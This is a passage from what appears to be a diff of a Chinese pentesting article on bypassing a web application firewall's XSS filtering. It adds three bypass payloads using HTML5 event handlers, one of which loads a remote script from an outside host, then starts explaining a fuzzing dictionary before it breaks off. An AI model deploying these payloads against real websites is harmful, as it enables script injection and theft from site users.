@@ -35,8 +35,18 @@
 - - -
 说实话，我在测这个waf时，过程很顺利，可能是我测过几个waf的原因，感觉对xss检测不是很严，可能是我测试的环境`太乐观了`，毕竟实战各种`鸡肋环境`，但是我发现对于HTML5新出的几个标签属性还是没过滤的，还有少数waf，on事件没过滤全，可能有些on事件属于比较鸡肋的。
 
+Bypass payload:
 ```
 <details open ontoggle=[1].find(alert)>
 <select autofocus onfocus=[2].find(alert)>
 <input autofocus onfocus=s=createElement("scriPt");body.appendChild(s);s.src="//xss.xx/1te">
 ```
+
+## fuzz字典
+- - -
+为什么我很快能得到Bypass payload呢，因为我自己有收集和构造属于自己的字典，下面我大概讲解下自己的思路。
+
+![9.png](https://ae01.alicdn.com/kf/Ua94d1a7baeb249898c60906edc6929b1p.png)
+
+### [TAG]标签
+从上图看出一个xss的基本结构，
